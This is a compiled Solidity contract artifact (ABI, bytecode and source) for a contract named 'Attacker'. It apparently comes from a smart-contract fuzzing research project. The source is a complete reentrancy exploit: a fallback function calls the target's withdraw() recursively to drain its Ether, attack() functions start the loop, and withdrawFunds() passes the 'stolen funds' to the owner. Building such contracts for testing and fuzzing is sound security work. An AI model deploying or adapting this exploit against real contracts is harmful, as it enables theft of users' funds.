{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vulnerableAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        }
      ],
      "name": "FallbackTriggered",
      "type": "event"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attackAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "vulnerable",
      "outputs": [
        {
          "internalType": "contract VulnerableContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610960380380610960833981810160405281019061003291906100ce565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610140565b6000815190506100c881610129565b92915050565b6000602082840312156100e057600080fd5b60006100ee848285016100b9565b91505092915050565b600061010282610109565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610132816100f7565b811461013d57600080fd5b50565b6108118061014f6000396000f3fe6080604052600436106100745760003560e01c8063881935651161004e57806388193565146101da5780638da5cb5b146102055780639e5faafc14610230578063f66ad59a1461023a57610075565b806312065fe01461017c57806324600fc3146101a757806364dd891a146101be57610075565b5b7fbcb33634347fed469e82cf9af84e72f83d9ae2d510553135fa3b8ea727ac2c3f476040516100a49190610726565b60405180910390a160025460008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061017a5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6002546040518263ffffffff1660e01b81526004016101479190610726565b600060405180830381600087803b15801561016157600080fd5b505af1158015610175573d6000803e3d6000fd5b505050505b005b34801561018857600080fd5b50610191610265565b60405161019e9190610726565b60405180910390f35b3480156101b357600080fd5b506101bc61026d565b005b6101d860048036038101906101d39190610610565b610368565b005b3480156101e657600080fd5b506101ef61047e565b6040516101fc9190610726565b60405180910390f35b34801561021157600080fd5b5061021a610484565b60405161022791906106b5565b60405180910390f35b6102386104aa565b005b34801561024657600080fd5b5061024f6105d7565b60405161025c91906106d0565b60405180910390f35b600047905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146102fd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102f490610706565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610365573d6000803e3d6000fd5b50565b8060028190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004016000604051808303818588803b1580156103d757600080fd5b505af11580156103eb573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d826040518263ffffffff1660e01b81526004016104499190610726565b600060405180830381600087803b15801561046357600080fd5b505af1158015610477573d6000803e3d6000fd5b5050505050565b60025481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b67016345785d8a000060028190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db067016345785d8a00006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561052957600080fd5b505af115801561053d573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d67016345785d8a00006040518263ffffffff1660e01b81526004016105a391906106eb565b600060405180830381600087803b1580156105bd57600080fd5b505af11580156105d1573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008135905061060a816107c4565b92915050565b60006020828403121561062257600080fd5b6000610630848285016105fb565b91505092915050565b61064281610752565b82525050565b6106518161078e565b82525050565b610660816107b2565b82525050565b6000610673601783610741565b91507f4f6e6c79206f776e65722063616e2077697468647261770000000000000000006000830152602082019050919050565b6106af81610784565b82525050565b60006020820190506106ca6000830184610639565b92915050565b60006020820190506106e56000830184610648565b92915050565b60006020820190506107006000830184610657565b92915050565b6000602082019050818103600083015261071f81610666565b9050919050565b600060208201905061073b60008301846106a6565b92915050565b600082825260208201905092915050565b600061075d82610764565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b6000610799826107a0565b9050919050565b60006107ab82610764565b9050919050565b60006107bd82610784565b9050919050565b6107cd81610784565b81146107d857600080fd5b5056fea2646970667358221220358e99c4af9e2341f9777bb7138ce35cd076838a1e51d2212872eb1a4116ce8364736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./VulnerableContract.sol\";\r\n\r\ncontract Attacker {\r\n    \r\n    VulnerableContract public vulnerable;\r\n    address public owner;\r\n    uint256 public attackAmount;\r\n\r\n    event FallbackTriggered(uint256 balance);\r\n\r\n    constructor(address _vulnerableAddress) {\r\n        vulnerable = VulnerableContract(_vulnerableAddress);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // Fallback function to perform the reentrancy attack\r\n    fallback() external payable {\r\n        emit FallbackTriggered(address(this).balance);\r\n\r\n        if (address(vulnerable).balance >= attackAmount) {\r\n            vulnerable.withdraw(attackAmount);  // Recursive call\r\n        }\r\n    }\r\n\r\n    // Function to initiate the attack\r\n    function attack(uint256 _amount) external payable {\r\n        attackAmount = _amount;\r\n        vulnerable.deposit{value: _amount}();  // Deposit Ether to the vulnerable contract\r\n        vulnerable.withdraw(_amount);  // Start reentrancy attack\r\n    }\r\n    \r\n\r\n    function attack() external payable {\r\n        attackAmount = 0.1 ether;  // Hardcoded for testing\r\n        vulnerable.deposit{value: 0.1 ether}();\r\n        vulnerable.withdraw(0.1 ether);\r\n    }\r\n\r\n\r\n    // Function to withdraw stolen funds\r\n    function withdrawFunds() external {\r\n        require(msg.sender == owner, \"Only owner can withdraw\");\r\n        payable(owner).transfer(address(this).balance);\r\n    }\r\n\r\n    // Function to check the balance of the attacker contract\r\n    function getBalance() public view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n\r\n}\r\n",
  "sourcePath": "/Users/andrijasa/Workspace/project/madrl/smartcontractdrlfuz/env1_dev2/contracts/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-09-20T10:45:14.942Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}